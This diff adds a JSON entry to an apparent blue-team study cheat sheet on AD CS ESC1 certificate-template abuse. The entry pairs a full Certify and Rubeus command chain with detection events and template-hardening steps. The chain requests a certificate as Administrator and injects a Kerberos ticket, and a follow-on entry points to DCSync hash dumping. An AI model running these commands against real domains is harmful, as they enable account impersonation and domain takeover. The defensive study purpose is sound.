@@ -1,0 +1,107 @@
+{
+  "id": "cdsa-m06-pki-esc1",
+  "name": "PKI ESC1 \u2014 Misconfigured Certificate Template (SAN Abuse)",
+  "command": ".\\Certify.exe find /vulnerable",
+  "description": "ESC1: certificate templates that allow requesters to specify a Subject Alternative Name (SAN) and grant enrollment to low-privileged users. Attacker requests a certificate with SAN set to Administrator (or any privileged account), then uses Rubeus to get a TGT as that account. No password needed. Detection: Events 4886/4887 on CA server \u2014 examine template name and SAN in issued certificates. Log volume high, requires filtering.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "quiet",
+  "category": "Active Directory Defense",
+  "subcategory": "PKI Attacks",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "pki",
+    "esc1",
+    "certify",
+    "adcs",
+    "certificate",
+    "san",
+    "kerberos",
+    "active-directory",
+    "blue-team"
+  ],
+  "mitre": [
+    "T1649",
+    "T1558.001"
+  ],
+  "notes": "=== BACKGROUND ===\n  ESC1 conditions (all must be true):\n    1. Certificate template allows 'Enrollee Supplies Subject' (SAN override)\n    2. Template has 'Client Authentication' or 'Smart Card Logon' EKU\n    3. Low-privileged users can enroll in the template\n  \n  Result: any domain user can request a certificate claiming to be ANY user\n  Certificates are valid for Kerberos PKINIT \u2192 get TGT as Administrator\n\nLab template: UserCert on CA eagle-CA (PKI server at <PKI_IP>)\n\n=== ATTACK ===\n# Step 1: Enumerate vulnerable certificate templates\n.\\Certify.exe find /vulnerable\n  \u2192 Look for:\n    [!] Vulnerable Certificates Templates\n    Template Name: <TEMPLATE>\n    msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT\n    pkiextendedkeyusage: Client Authentication\n    Enrollment Rights: Domain Users (or any low-priv group)\n\n# Step 2: Request a certificate as Administrator\n.\\Certify.exe request /ca:<CA_FQDN>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator\n  \u2192 /ca: Certification Authority full name (e.g., PKI.eagle.local\\eagle-CA)\n  \u2192 /template: the vulnerable template name (e.g., UserCert)\n  \u2192 /altname: the user to impersonate in the SAN\n  \u2192 Output: PEM-format certificate + private key saved to cert.pem\n\n# Step 3: Fix line format in cert.pem (required!)\nsed -i 's/\\s\\s\\+/\\n/g' cert.pem\n  \u2192 Certify sometimes outputs cert + key on single line with extra spaces\n  \u2192 This converts to proper PEM format\n\n# Step 4: Convert PEM to PFX (PKCS#12) for Rubeus\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n  \u2192 Enter export password when prompted (can be blank, hit Enter)\n  \u2192 -CSP flag ensures correct crypto provider for Windows Kerberos\n\n# Step 5: Use certificate to get Kerberos TGT as Administrator\n.\\Rubeus.exe asktgt /domain:<DOMAIN> /user:Administrator /certificate:cert.pfx /dc:<DC_FQDN> /ptt\n  \u2192 /certificate: path to the PFX file\n  \u2192 /ptt: inject ticket immediately\n  \u2192 If PFX has password: add /password:<password>\n\n# Step 6: Verify and use ticket\nklist\ndir \\\\<DC_HOSTNAME>\\c$\n\n=== DETECTION ===\nEvent 4886: 'Certificate Services received a certificate request'\n  \u2192 Logged on CA server\n  \u2192 Contains: requester account, template name, SAN\n  \u2192 Alert when: SAN != requester account name\n  \u2192 Alert when: template allows SAN override + low-priv enrollment\n\nEvent 4887: 'Certificate Services approved a certificate request'\n  \u2192 Issued certificate logged on CA\n  \u2192 Contains same info as 4886 when auto-approved\n\nDetection steps:\n  \u2192 PSRemote to PKI server\n  \u2192 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Format-List\n  \u2192 Correlate: requester != SAN subject = ESC1 abuse\n\nAlternate: use certutil -view to list all issued certificates\ncertutil -view -restrict \"RequesterName=<USERNAME>\"\n\n=== PREVENTION ===\n  \u2192 Remove 'Enrollee Supplies Subject' flag from all templates unless required\n  \u2192 Require Manager Approval for templates with SAN override\n  \u2192 Restrict enrollment rights to only accounts that need the certificate\n  \u2192 Run Certify.exe find /vulnerable regularly\n  \u2192 Audit CA templates with: Get-ADObject -SearchBase '<CA_DN>' -Filter *",
+  "examples": [
+    {
+      "label": "Find vulnerable certificate templates (Certify)",
+      "command": ".\\Certify.exe find /vulnerable"
+    },
+    {
+      "label": "Request certificate with SAN set to Administrator",
+      "command": ".\\Certify.exe request /ca:<CA_FQDN>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator"
+    },
+    {
+      "label": "Fix PEM line format before converting",
+      "command": "sed -i 's/\\s\\s\\+/\\n/g' cert.pem"
+    },
+    {
+      "label": "Convert PEM to PFX for Rubeus",
+      "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
+    },
+    {
+      "label": "Get TGT as Administrator using certificate (PKINIT)",
+      "command": ".\\Rubeus.exe asktgt /domain:<DOMAIN> /user:Administrator /certificate:cert.pfx /dc:<DC_FQDN> /ptt"
+    },
+    {
+      "label": "Verify injected ticket",
+      "command": "klist"
+    },
+    {
+      "label": "Check CA events for certificate issuance (run on PKI server)",
+      "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4887} | Format-List"
+    },
+    {
+      "label": "List issued certificates via certutil",
+      "command": "certutil -view -restrict \"DispositionMessage=Issued\" -out RequesterName,CommonName,UPN,CertificateTemplate"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned (ESC1-ESC8)",
+      "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    },
+    {
+      "title": "GitHub - Certify",
+      "url": "https://github.com/GhostPack/Certify"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-pki-esc8",
+      "rel": "next",
+      "note": "ESC8: NTLM relay to ADCS HTTP endpoint \u2014 different vector, same goal."
+    },
+    {
+      "id": "cdsa-m06-dcsync",
+      "rel": "next",
+      "note": "After gaining DA via certificate, DCSync to dump all domain hashes."
+    }
+  ],
+  "defense": {
+    "why_it_works": "An ESC1 certificate template lets the enrollee supply the Subject Alternative Name, carries a Client Authentication/Smart Card Logon EKU, and permits low-privileged enrollment. So any domain user can request a certificate claiming to be Administrator and use it for Kerberos PKINIT.",
+    "prerequisites": "A vulnerable template (Enrollee Supplies Subject + auth EKU + low-priv enrollment rights) and any domain user able to enroll.",
+    "impact": "A Kerberos TGT as any impersonated account (e.g., Administrator) with no password \u2014 a direct path to privileged access and, via the DC, domain compromise.",
+    "detection": "Event 4886 ('Certificate Services received a certificate request') and 4887 ('\u2026approved\u2026') on the CA. Alert when the SAN does not match the requester account, or when a template allowing SAN override + low-priv enrollment is used. certutil -view can list issued certificates for correlation.",
+    "artifacts": "4886/4887 events on the CA where requester != SAN subject; Certify.exe request execution; a cert.pem/cert.pfx on the attacker host; Rubeus asktgt with /certificate.",
+    "prevention": "Remove the 'Enrollee Supplies Subject' flag from templates unless required; require Manager Approval on templates with SAN override; restrict enrollment rights to accounts that actually need the cert; run Certify find /vulnerable regularly.",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1649",
+      "SpecterOps AD CS research"
+    ],
+    "misconfiguration": "An ADCS certificate template is misconfigured with ESC1 conditions: (1) 'Enrollee supplies subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) is enabled, allowing the requester to specify any SAN (Subject Alternative Name) \u2014 including a Domain Admin UPN; (2) Low-privilege users (Domain Users, Authenticated Users) have Enroll or AutoEnroll rights on the template; (3) Client Authentication EKU is set. This lets any domain user request a certificate that authenticates as any other user.",
+    "vulnerable_config": "# Certificate template properties (via Certify or ADCS MMC):\n# Template: UserWebAuth\n#   Subject Name: 'Supply in the request' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)\n#   EKU: Client Authentication (1.3.6.1.5.5.7.3.2)\n#   Enrollment: Domain Users (Enroll)\n# -> Any domain user can request a cert claiming UPN administrator@corp.local\n\n# Certify scan:\n# Certify.exe find /vulnerable\n# [+] ESC1: UserWebAuth  -- 'Supply in request', Domain Users Enroll, Client Auth",
+    "secure_config": "# Fix CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT:\n# ADCS MMC -> Certificate Templates -> UserWebAuth -> Properties\n# Subject Name tab -> change 'Supply in the request' to\n#   'Build from this Active Directory information'\n\n# Remove broad enrollment rights:\n# Security tab -> remove 'Domain Users' -> add only the specific group that needs the cert\n\n# Enable CA Manager Approval for sensitive templates:\n# Issuance Requirements tab -> 'CA certificate manager approval' = checked\n# This requires a human review before each certificate is issued\n\n# Run Certify/PSPKIAudit quarterly to detect new vulnerable templates:\n# Invoke-PKIAudit\n\n# Enforce SID extension (Windows Server 2022+):\n# Prevents certificate from authenticating as another user even with alt SAN"
+  }
+}
